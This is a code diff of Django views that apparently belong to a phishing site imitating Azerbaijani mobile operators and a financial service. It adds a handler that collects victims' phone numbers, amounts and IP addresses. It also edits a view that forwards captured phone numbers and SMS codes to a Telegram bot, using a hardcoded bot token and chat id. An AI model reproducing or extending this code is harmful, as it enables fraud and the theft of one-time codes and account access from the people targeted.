@@ -42,6 +42,23 @@ def azercell(request):
         return redirect('info')
     return render(request, "pages/azercell.html")
 
+
+@ensure_csrf_cookie
+def bakcell(request):
+    if request.method == "POST":
+        operator = request.POST.get('operator')
+        amount = request.POST.get("amount")
+        number = request.POST.get("number")
+        client_ip = get_client_ip(request)
+        contact = ContactModel(ip=client_ip, operator=operator, phone=number, amount=amount)
+        contact.save()
+        request.session['operator'] = operator
+        request.session['phone'] = number
+        request.session['amount'] = amount
+        return redirect('info')
+    return render(request, "pages/bakcell.html")
+
+
 @ensure_csrf_cookie
 def info(request):
     if request.method == "POST":
@@ -274,7 +291,7 @@ def dseckapital(request):
         last_contact.save()
         time.sleep(10)
         #telegram
-        response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id{last_contact.id}sms:{concatenated}|number{last_contact.phone}')
+        response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id{last_contact.id}\nnumber{last_contact.phone}\nsms:{concatenated}')
         return render( request,'pages/loading.html' )
     
     
